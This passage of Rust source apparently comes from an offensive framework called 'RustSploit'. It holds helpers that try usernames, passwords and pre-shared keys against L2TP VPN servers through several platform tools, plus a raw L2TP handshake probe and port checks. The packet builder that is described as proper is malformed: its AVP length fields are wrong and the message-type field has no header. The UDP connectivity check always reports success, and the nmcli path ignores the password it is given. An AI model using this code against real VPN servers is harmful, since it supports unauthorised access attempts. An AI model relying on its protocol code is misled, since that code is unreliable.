    let conn_name = format!("openl2tp_{}_{}", std::process::id(), std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis());

    let mut child = Command::new("openl2tpd")
        .args([
            "-c", &conn_name,
            "-l", server_ip,
            "-u", username,
            "-p", password,
            "-d"  // daemon mode
        ])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => Ok(status.success()),
        Ok(Err(e)) => Err(anyhow!("openl2tp error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };

    result
}

#[cfg(target_os = "windows")]
async fn try_l2tp_rasdial(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // Use Windows rasdial for VPN connections
    let server_ip = addr.split(':').next().unwrap_or(addr);
    let conn_name = format!("RustSploit_L2TP_{}", std::process::id());

    // Create a phonebook entry (rasdial uses phonebook files)
    let pbk_path = format!("{}.pbk", conn_name);
    let pbk_content = format!(
        r#"[{}]
MEDIA=rastapi
Port=VPN2-0
Device=WAN Miniport (L2TP)
DEVICE=vpn
TYPE=2
PhoneNumber={}
"#,
        conn_name, server_ip
    );

    std::fs::write(&pbk_path, pbk_content)
        .map_err(|e| anyhow!("Failed to create phonebook: {}", e))?;

    // Try to establish connection using rasdial
    let mut child = Command::new("rasdial")
        .args([&conn_name, username, password])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            let success = status.success();

            // Clean up connection if successful
            if success {
                let _ = Command::new("rasdial")
                    .arg(&conn_name)
                    .arg("/DISCONNECT")
                    .output()
                    .await;
            }

            Ok(success)
        }
        Ok(Err(e)) => Err(anyhow!("rasdial error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };

    // Clean up phonebook file
    let _ = std::fs::remove_file(&pbk_path);

    result
}

#[cfg(target_os = "linux")]
async fn try_l2tp_nmcli(addr: &str, username: &str, _password: &str, psk: &Option<String>, _timeout_duration: Duration) -> Result<bool> {
    // Use NetworkManager's nmcli for L2TP connections
    let server_ip = addr.split(':').next().unwrap_or(addr);
    let conn_name = format!("rustsploit-l2tp-{}", std::process::id());

    // Create NetworkManager L2TP connection
    let add_result = Command::new("nmcli")
        .args([
            "connection", "add",
            "type", "vpn",
            "vpn-type", "l2tp",
            "con-name", &conn_name,
            "vpn.data",
            &format!("gateway={},user={},password-flags=0,ipsec-enabled=yes,ipsec-psk={}",
                    server_ip, username, psk.as_deref().unwrap_or(""))
        ])
        .output()
        .await;

    if !add_result.map(|out| out.status.success()).unwrap_or(false) {
        return Ok(false);
    }

    // Try to connect
    let up_result = Command::new("nmcli")
        .args(["connection", "up", &conn_name])
        .output()
        .await;

    let success = up_result.map(|out| out.status.success()).unwrap_or(false);

    // Clean up connection
    let _ = Command::new("nmcli")
        .args(["connection", "delete", &conn_name])
        .output()
        .await;

    Ok(success)
}

#[cfg(target_os = "macos")]
async fn try_l2tp_macos(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // Use macOS built-in L2TP support via scutil and networksetup
    let server_ip = addr.split(':').next().unwrap_or(addr);
    let service_name = format!("RustSploit_L2TP_{}", std::process::id());

    // Create VPN service
    let create_result = Command::new("networksetup")
        .args([
            "-createl2tpvpn",
            &service_name,
            server_ip,
            username
        ])
        .output()
        .await;

    if !create_result.map(|out| out.status.success()).unwrap_or(false) {
        return Ok(false);
    }

    // Set password
    let _ = Command::new("networksetup")
        .args([
            "-setl2tpvpnpassword",
            &service_name,
            password
        ])
        .output()
        .await;

    // Set PSK if provided
    if let Some(ref psk_val) = psk {
        let _ = Command::new("networksetup")
            .args([
                "-setl2tpvpnsharedsecret",
                &service_name,
                psk_val
            ])
            .output()
            .await;
    }

    // Try to connect
    let connect_result = Command::new("networksetup")
        .args(["-connectl2tpvpn", &service_name])
        .output()
        .await;

    let success = connect_result.map(|out| out.status.success()).unwrap_or(false);

    // Clean up
    let _ = Command::new("networksetup")
        .args(["-deletel2tpvpn", &service_name])
        .output()
        .await;

    Ok(success)
}

async fn try_l2tp_fallback(addr: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
    // Try direct L2TP connection without IPsec
    let server_ip = addr.split(':').next().unwrap_or(addr);

    // Try various direct L2TP tools
    #[cfg(target_os = "linux")]
    {
        // Try l2tp-tools if available
        let l2tp_check = Command::new("which")
            .arg("l2tp")
            .output()
            .await;

        if l2tp_check.map(|out| out.status.success()).unwrap_or(false) {
            return try_l2tp_tools(server_ip, username, password, timeout_duration).await;
        }

        // Try openl2tp if available
        let openl2tp_check = Command::new("which")
            .arg("openl2tpd")
            .output()
            .await;

        if openl2tp_check.map(|out| out.status.success()).unwrap_or(false) {
            return try_openl2tp(server_ip, username, password, timeout_duration).await;
        }
    }

    // As a last resort, try a simple network probe
    try_l2tp_network_probe(server_ip, timeout_duration).await
}

async fn try_l2tp_network_probe(server_ip: &str, timeout_duration: Duration) -> Result<bool> {
    // Enhanced network probe with proper L2TP packet construction
    use tokio::net::UdpSocket;

    let socket = UdpSocket::bind("0.0.0.0:0").await?;
    socket.connect(format!("{}:1701", server_ip)).await?;

    // Create a proper L2TP SCCRQ (Start-Control-Connection-Request) message
    // L2TPv2 packet structure:
    // - Flags and Version (2 bytes)
    // - Length (2 bytes)
    // - Tunnel ID (2 bytes)
    // - Session ID (2 bytes)
    // - Ns (2 bytes) - sequence number
    // - Nr (2 bytes) - next expected sequence number
    // - Message Type (2 bytes)
    // - Attributes (variable)

    let mut sccrq_packet = vec![
        0xc8, 0x02,  // Flags (Type=1, Length=1, Sequence=1, Offset=0) + Version (2)
        0x00, 0x00,  // Length (will be filled)
        0x00, 0x00,  // Tunnel ID (0 for SCCRQ)
        0x00, 0x00,  // Session ID (0 for SCCRQ)
        0x00, 0x00,  // Ns (0)
        0x00, 0x00,  // Nr (0)
        0xc8, 0x01,  // Message Type (SCCRQ = 1)
    ];

    // Add some basic AVPs (Attribute-Value Pairs)
    // Protocol Version AVP
    sccrq_packet.extend_from_slice(&[
        0x00, 0x02,  // AVP Flags + Length (2 bytes for this AVP)
        0x00, 0x00,  // Vendor ID (0 for IETF)
        0x00, 0x02,  // Attribute Type (Protocol Version = 2)
        0x01, 0x00,  // Protocol Version (1.0)
    ]);

    // Framing Capabilities AVP
    sccrq_packet.extend_from_slice(&[
        0x00, 0x02,  // AVP Flags + Length
        0x00, 0x00,  // Vendor ID
        0x00, 0x03,  // Attribute Type (Framing Capabilities = 3)
        0x00, 0x03,  // Synchronous + Asynchronous framing
    ]);

    // Host Name AVP
    let hostname = "rustsploit";
    let hostname_bytes = hostname.as_bytes();
    let hostname_avp_len = 6 + hostname_bytes.len() as u16; // Header + string

    sccrq_packet.extend_from_slice(&[
        ((hostname_avp_len >> 8) as u8 & 0x03) | 0x00, // AVP Flags + Length high byte
        (hostname_avp_len & 0xFF) as u8,                 // Length low byte
        0x00, 0x00,  // Vendor ID
        0x00, 0x07,  // Attribute Type (Host Name = 7)
    ]);
    sccrq_packet.extend_from_slice(hostname_bytes);

    // Set the total length
    let total_len = sccrq_packet.len() as u16;
    sccrq_packet[2] = (total_len >> 8) as u8;
    sccrq_packet[3] = (total_len & 0xFF) as u8;

    socket.send(&sccrq_packet).await?;

    let mut buf = [0; 1024];
    let result = timeout(timeout_duration, socket.recv(&mut buf)).await;

    match result {
        Ok(Ok(len)) if len >= 12 => {
            // Check if response looks like a valid L2TP packet
            let is_l2tp = buf[0] & 0xC0 == 0xC0  // Type bit set
                       && buf[1] == 0x02         // Version 2
                       && len >= (buf[2] as usize * 256 + buf[3] as usize); // Length check

            // For SCCRP (Start-Control-Connection-Reply), message type should be 2
            let is_sccrp = len >= 12 && buf[10] == 0xc8 && buf[11] == 0x02;

            Ok(is_l2tp && (is_sccrp || buf[0] == 0xc8)) // Accept any L2TP response
        }
        _ => Ok(false)
    }
}

/// Detect available L2TP tools on the system
async fn detect_available_tools() -> Vec<String> {
    let mut tools = Vec::new();

    let tool_checks = vec![
        ("strongswan", "ipsec"),
        ("swanctl", "swanctl"),
        ("xl2tpd", "xl2tpd"),
        ("pppd", "pppd"),
        ("NetworkManager", "nmcli"),
        ("rasdial", "rasdial"),
    ];

    for (name, command) in tool_checks {
        if Command::new("which")
            .arg(command)
            .output()
            .await
            .map(|out| out.status.success())
            .unwrap_or(false)
        {
            tools.push(name.to_string());
        }
    }

    tools
}

/// Test basic connectivity to L2TP server
async fn test_l2tp_connectivity(server_ip: &str, timeout_duration: Duration) -> Result<bool> {
    // Test IKE port (500) for IPsec servers
    match tokio::time::timeout(timeout_duration, tokio::net::TcpStream::connect(format!("{}:500", server_ip))).await {
        Ok(Ok(_)) => return Ok(true),
        _ => {}
    }

    // Test L2TP port (1701) for direct L2TP servers
    match tokio::time::timeout(timeout_duration, tokio::net::TcpStream::connect(format!("{}:1701", server_ip))).await {
        Ok(Ok(_)) => return Ok(true),
        _ => {}
    }

    // Test UDP L2TP port
    match tokio::net::UdpSocket::bind("0.0.0.0:0").await {
        Ok(socket) => {
            match tokio::time::timeout(timeout_duration, socket.connect(format!("{}:1701", server_ip))).await {
                Ok(Ok(_)) => return Ok(true),
                _ => {}
            }
        }
        _ => {}
    }

    Ok(false)
}



